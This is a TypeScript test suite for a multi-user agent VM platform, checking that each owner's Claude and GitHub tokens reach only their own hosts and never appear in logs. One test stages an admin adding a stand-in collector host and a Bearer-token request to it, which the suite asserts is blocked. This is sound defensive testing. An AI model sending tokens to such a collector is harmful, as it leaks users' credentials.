import { test } from "node:test";
import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import { join } from "node:path";
import { dir, image, observeNode, testApi } from "../test-support/api-kit.ts";
import { testObservation } from "../test-support/kit.ts";
import { loginStore } from "./logins.ts";
import { ownerLogins } from "./owner-logins.ts";
import { tailnet, type WhoisAnswer } from "../test-support/people.ts";
import { parseWhois } from "../node-base/tailscaled.ts";
import { networkOptions } from "../pylon-vm/network.ts";
import { githubGuardOf } from "../backends/pylon-vm/pylon-vm-backend.ts";
import type { BootSpec } from "../pylon-vm/contracts.ts";
import type { ImageId, NodeName, Person, PylonId } from "../ids.ts";
import type { NodeObservation } from "../protocol/observations.ts";
import { peopleOf } from "./people.ts";
import { nodeSecrets } from "../probe/config.ts";

const alice = tailnet.alice.UserProfile!.LoginName as Person;
const bob = tailnet.bob.UserProfile!.LoginName as Person;
const people = peopleOf({ [alice]: "admin", [bob]: "engineer" });
const bobClaude = "sk-ant-oat01-bob-made-up-0000";
const bobGithub = "ghp_bobMadeUp0000";
const bobIdentity = { name: "Owner of ghp_bobM", email: `${bobGithub.length}+ghp_bobm@users.noreply.github.com` };

const mono = {
  id: "mono", repoUrl: "https://github.com/acme/mono.git", defaultBranch: "main", defaultNode: "rj-firebat",
  resources: { cpus: 2, memoryGiB: 4, diskGiB: 10 }, allowedHosts: [],
  secrets: [{ name: "GH_TOKEN", hosts: ["api.github.com", "github.com"] }, { name: "CLAUDE_CODE_OAUTH_TOKEN", hosts: ["api.anthropic.com"] }, { name: "STRIPE_KEY", hosts: ["api.stripe.com"] }],
  logins: [], preSetup: null,
};

/** An install whose people have signed in to nothing. */
async function shared(t: Parameters<typeof testApi>[0]) {
  let caller: WhoisAnswer = tailnet.alice;
  const s = await testApi(t, { people, allowed: new Set(), whois: async () => ({ id: caller.Node.StableID, ...parseWhois(caller).identity }), logins: loginStore(join(dir, randomUUID())) });
  const as = (a: WhoisAnswer) => { caller = a; };
  assert.equal((await s.call("POST", "/v1/projects", mono)).status, 201);
  assert.equal((await s.call("POST", "/v1/images", image)).status, 201);
  s.registry.images.setCurrentImage(image.id as ImageId);
  return { ...s, as };
}

test("an admin's edit of a shared project changes no host that receives an engineer's token and no commit author", async (t) => {
  const s = await shared(t);
  s.as(tailnet.bob);
  await s.call("PUT", "/v1/logins/claude", { token: bobClaude });
  await s.call("PUT", "/v1/logins/github", { token: bobGithub });

  s.as(tailnet.alice);
  const edit = await s.call("PATCH", "/v1/projects/mono", {
    secrets: [{ name: "GH_TOKEN", hosts: ["api.github.com", "github.com", "collector.alice-owned.example"] }, { name: "CLAUDE_CODE_OAUTH_TOKEN", hosts: ["api.anthropic.com", "collector.alice-owned.example"] }],
    gitIdentity: { name: "Engineer A", email: "a@example.com" },
  });
  assert.equal(edit.status, 200, "the admin may edit the project");

  s.as(tailnet.bob);
  const started = await s.call("POST", "/v1/threads", { project: "mono", title: "bob's work", claude: "fix the bug" });
  assert.equal(started.status, 201);
  const { boot } = s.registry.threads.pylon(started.body.pylonId)!;
  assert.deepEqual(boot.network.secrets, [
    { name: "CLAUDE_CODE_OAUTH_TOKEN", hosts: ["api.anthropic.com"], owner: true },
    { name: "GH_TOKEN", hosts: ["api.github.com", "github.com"], owner: true },
  ], "bob's tokens go only to their own hosts, whatever the project grants");
  assert.deepEqual(githubGuardOf(boot), { githubGuard: { defaultBranch: "main" } }, "bob's pylon boots behind the GitHub guard, with the project's default branch");
  assert.deepEqual(boot.gitIdentity, bobIdentity, "bob's commits are authored as the account of his GitHub login, not as the project says");
  assert.deepEqual(s.pylonSecrets.filter(([pylon]) => pylon === started.body.pylonId).map(([, name, value]) => [name, value]),
    [["CLAUDE_CODE_OAUTH_TOKEN", bobClaude], ["GH_TOKEN", bobGithub]], "the probe holds bob's own values for bob's pylon");

  const spec: BootSpec = {
    resources: { cpus: 2, memoryGiB: 4 }, allowedHosts: [...boot.network.allowedHosts],
    secrets: Object.fromEntries(boot.network.secrets.map((g) => [g.name, { hosts: [...g.hosts], value: g.name === "GH_TOKEN" ? bobGithub : bobClaude }])),
    ssh: null, files: [], hooks: [], publicUrls: {}, hostBridge: null,
  };
  const { httpHooks, placeholders } = networkOptions(spec, started.body.pylonId);
  await assert.rejects(async () => httpHooks!.onRequest!(new Request("https://collector.alice-owned.example/ping", { headers: { authorization: `Bearer ${placeholders["GH_TOKEN"]}` } })),
    /secret GH_TOKEN not allowed for host: collector\.alice-owned\.example/, "bob's token never leaves for the host the admin added");
});

test("a start whose owner lacks a login is refused naming it, and does not fall back to the project's grant", async (t) => {
  const s = await shared(t);
  s.as(tailnet.bob);
  await s.call("PUT", "/v1/logins/github", { token: bobGithub });
  const refused = await s.call("POST", "/v1/threads", { project: "mono", title: "bob's work", claude: "fix the bug" });
  assert.equal(refused.status, 409);
  assert.equal(refused.body.code, "no-login");
  assert.match(refused.body.error, /bob@example\.com has no Claude login/);
  assert.match(refused.body.error, /nexus login claude/);
  assert.doesNotMatch(JSON.stringify(refused.body), new RegExp(bobGithub), "the refusal carries no token");
  assert.deepEqual(s.registry.threads.threads().map((x) => x.title), [], "no thread or pylon was made");
  assert.deepEqual(s.pylonSecrets, [], "nothing was handed to the probe");

  await s.call("DELETE", "/v1/logins/github");
  const neither = await s.call("POST", "/v1/threads", { project: "mono", claude: "bob's work" });
  assert.match(neither.body.error, /has no Claude or GitHub login.*nexus login claude and nexus login github/);
});

test("an owner's grant boots with the pylon's own value or a stand-in, never the node's value", () => {
  const secrets = nodeSecrets({ value: (name) => name === "GH_TOKEN" ? "ghp_theNodesOwnToken" : undefined, names: () => ["GH_TOKEN"] });
  const pylon = "pylon-bob" as PylonId;
  assert.equal(secrets.value("GH_TOKEN", pylon), "ghp_theNodesOwnToken", "a project's grant reads the node's file as before");
  const standIn = secrets.value("GH_TOKEN", pylon, true);
  assert.notEqual(standIn, "ghp_theNodesOwnToken", "an owner's grant with no value handed over does not take the node's");
  assert.ok(standIn !== undefined && standIn.length > 0, "and boots with a stand-in until the handoff");
  secrets.holdFor(pylon, "GH_TOKEN", bobGithub);
  assert.equal(secrets.value("GH_TOKEN", pylon, true), bobGithub);
});

test("a probe that restarted is handed each owner's values again, for that owner's pylons only", async (t) => {
  const s = await shared(t);
  const pylons: Record<string, PylonId> = {};
  for (const [who, answer, claude, github] of [["alice", tailnet.alice, "sk-ant-oat01-alice-made-up", "ghp_aliceMadeUp"], ["bob", tailnet.bob, bobClaude, bobGithub]] as const) {
    s.as(answer);
    await s.call("PUT", "/v1/logins/claude", { token: claude });
    await s.call("PUT", "/v1/logins/github", { token: github });
    pylons[who] = (await s.call("POST", "/v1/threads", { project: "mono", claude: `${who}'s work` })).body.pylonId;
  }
  const owners = s.owners!;
  const node = "rj-firebat" as NodeName;
  const handed = async (probeBootId: string, phase: "booting" | "running") => {
    s.pylonSecrets.length = 0;
    owners.observed(node, { probeBootId, pylons: Object.values(pylons).map((pylonId) => ({ pylonId, phase, bootedAt: "2027-01-01T00:00:00Z" }) as NodeObservation["pylons"][number]) });
    await owners.close();
    return s.pylonSecrets.map(([pylon, name, value]) => `${pylon} ${name} ${value}`).sort();
  };
  const both = [
    `${pylons.alice} CLAUDE_CODE_OAUTH_TOKEN sk-ant-oat01-alice-made-up`, `${pylons.alice} GH_TOKEN ghp_aliceMadeUp`,
    `${pylons.bob} CLAUDE_CODE_OAUTH_TOKEN ${bobClaude}`, `${pylons.bob} GH_TOKEN ${bobGithub}`,
  ].sort();
  assert.deepEqual(await handed("boot-1", "booting"), both, "a pylon still booting is handed its own values");
  assert.deepEqual(await handed("boot-1", "booting"), both, "and again while it boots, since its boot may have read them before they came");
  assert.deepEqual(await handed("boot-1", "running"), both, "and once more when it runs, where the probe swaps them in");
  assert.deepEqual(await handed("boot-1", "running"), [], "then not again on the same probe boot");
  assert.deepEqual(await handed("boot-2", "running"), both, "a probe that restarted is handed them again");
  assert.ok(s.logged.every((line) => !line.includes(bobGithub) && !line.includes(bobClaude)), "no log line holds a token");
});

test("a solo install boots with the project's grants, the node's values and the configured git identity", async (t) => {
  const s = await testApi(t);
  assert.equal((await s.call("POST", "/v1/projects", { ...mono, gitIdentity: { name: "Project", email: "project@example.com" } })).status, 201);
  assert.equal((await s.call("POST", "/v1/images", image)).status, 201);
  s.registry.images.setCurrentImage(image.id as ImageId);
  const started = await s.call("POST", "/v1/threads", { project: "mono", claude: "work" });
  assert.equal(started.status, 201);
  const { boot } = s.registry.threads.pylon(started.body.pylonId)!;
  assert.deepEqual(boot.network.secrets, mono.secrets);
  assert.deepEqual(boot.gitIdentity, { name: "Project", email: "project@example.com" });
  assert.deepEqual(s.pylonSecrets, []);
});

test("a shared install starts no pylon on a node whose probe would fall back to its secret file", async (t) => {
  const s = await shared(t);
  await s.call("PUT", "/v1/logins/claude", { token: "sk-ant-oat01-alice-made-up" });
  await s.call("PUT", "/v1/logins/github", { token: "ghp_aliceMadeUp" });
  const { ownerGrants: _, ...olderProbe } = testObservation("rj-firebat" as NodeName, { artifacts: [image.id] });
  s.registry.threads.ingested(olderProbe, []);
  const refused = await s.call("POST", "/v1/threads", { project: "mono", claude: "alice's work" });
  assert.equal(refused.status, 409);
  assert.equal(refused.body.code, "probe-too-old");
  s.registry.threads.ingested(testObservation("rj-firebat" as NodeName, { artifacts: [image.id], ownerGrants: true }), []);
  assert.equal((await s.call("POST", "/v1/threads", { project: "mono", claude: "alice's work" })).status, 201);
});

/** ownerLogins over one pylon of bob's on one node, whose login reads wait for `gate` while it is set. */
function onePylon() {
  const node = "n1" as NodeName;
  const pylonId = "pylon-th-000000000001" as PylonId;
  const puts: string[] = [];
  const logged: string[] = [];
  let gate: Promise<void> | null = null;
  let failing = false;
  let refusing = false;
  const owners = ownerLogins({
    registry: { threads: { pylonsWithThreadsOn: () => [{ pylon: { pylonId, boot: { network: { secrets: [{ name: "GH_TOKEN", hosts: ["github.com"], owner: true }] } } }, thread: { status: "active", owner: bob } }] } } as never,
    logins: { async owned() {
      await gate;
      if (failing) throw new Error("the logins of bob@example.com cannot be read: EACCES");
      return { claude: bobClaude, github: { token: bobGithub, identity: bobIdentity } };
    } },
    probes: new Map([[node, { async putPylonSecret(pylon: PylonId, name: string) {
      if (refusing) throw new Error(`PUT /v1/secrets/${name}/pylons/${pylon}: HTTP 503: its running instance was not updated`);
      puts.push(`${pylon} ${name}`);
    } }]]),
    log: (message) => { logged.push(message); },
  });
  const observe = (phase: "booting" | "stopped" | "running", bootedAt = "2027-01-01T00:00:00Z") =>
    owners.observed(node, { probeBootId: "b1", pylons: [{ pylonId, phase, bootedAt } as NodeObservation["pylons"][number]] });
  return { owners, observe, puts, logged, hold() { let open!: () => void; gate = new Promise((r) => { open = r; }); return () => { gate = null; open(); }; }, fail(on: boolean) { failing = on; }, refuse(on: boolean) { refusing = on; } };
}

test("a snapshot taken while a handoff was in flight never settles it, so a boot that read the stand-in is handed its values again", async () => {
  const o = onePylon();
  const release = o.hold();
  o.observe("stopped");
  o.observe("stopped");
  release();
  await o.owners.close();
  assert.equal(o.puts.length, 2, "one handoff of both values");
  o.observe("booting");
  await o.owners.close();
  assert.equal(o.puts.length, 4, "the pylon woke while its values were on the way, so it is handed them again");
  o.observe("running", "2027-01-01T00:05:00Z");
  await o.owners.close();
  o.observe("running", "2027-01-01T00:05:00Z");
  await o.owners.close();
  const settledAt = o.puts.length;
  o.observe("running", "2027-01-01T00:05:00Z");
  await o.owners.close();
  assert.equal(o.puts.length, settledAt, "once running on the boot it ran on when they were handed, they are in use");
});

test("a login file that cannot be read is logged and read again on the next snapshot", async () => {
  const o = onePylon();
  o.fail(true);
  o.observe("running");
  await o.owners.close();
  assert.deepEqual(o.puts, []);
  assert.match(o.logged.join("\n"), /could not be read: the logins of bob@example\.com cannot be read: EACCES/);
  o.fail(false);
  o.observe("running");
  await o.owners.close();
  assert.equal(o.puts.length, 2);
});

test("placement on a shared install passes by a node whose probe would fall back to its secret file, as a move does", async (t) => {
  const s = await shared(t);
  await s.call("PUT", "/v1/logins/claude", { token: "sk-ant-oat01-alice-made-up" });
  await s.call("PUT", "/v1/logins/github", { token: "ghp_aliceMadeUp" });
  observeNode(s, "older", { total: 64, committed: 0 });
  const { ownerGrants: _, ...older } = s.registry.nodes.node("older" as NodeName)!.observation!;
  s.registry.threads.ingested(older, []);
  const refused = await s.call("POST", "/v1/threads", { project: "mono", claude: "alice's work", node: "auto" });
  assert.equal(refused.status, 409);
  assert.match(refused.body.error, /older has a probe that would boot an owner's logins from its secret file/);
  observeNode(s, "newer", { total: 64, committed: 0 });
  const placed = await s.call("POST", "/v1/threads", { project: "mono", claude: "alice's work", node: "auto" });
  assert.equal(placed.status, 201);
  assert.equal(s.registry.threads.pylon(placed.body.pylonId)!.node, "newer");
});

test("a value the probe could not swap into the running pylon is handed again on the next snapshot, not settled", async () => {
  const o = onePylon();
  o.refuse(true);
  o.observe("running");
  await o.owners.close();
  o.observe("running");
  await o.owners.close();
  assert.deepEqual(o.puts, [], "every put was refused");
  assert.match(o.logged.join("\n"), /handing bob@example\.com's logins to .* failed: .*503/);
  o.refuse(false);
  o.observe("running");
  await o.owners.close();
  assert.equal(o.puts.length, 2, "the next snapshot hands them again");
  o.observe("running");
  await o.owners.close();
  assert.equal(o.puts.length, 2, "and once they landed on the same running boot they are in use");
});

test("a shared start refuses a node whose probe has not reported, since whether it keeps owner grants apart is unknown", async (t) => {
  const s = await shared(t);
  await s.call("PUT", "/v1/logins/claude", { token: "sk-ant-oat01-alice-made-up" });
  await s.call("PUT", "/v1/logins/github", { token: "ghp_aliceMadeUp" });
  s.registry.nodes.upsertNode({ name: "fresh" as NodeName, tailnetHost: "fresh.tail.ts.net", tailnetNodeId: "nFRESH" as never });
  const refused = await s.call("POST", "/v1/threads", { project: "mono", claude: "alice's work", node: "fresh" });
  assert.equal(refused.status, 409);
  assert.match(refused.body.error, /fresh's probe has not reported yet, so whether it keeps an owner's logins from its secret file is unknown/);
  assert.deepEqual(s.pylonSecrets, [], "nothing was handed to it");
});
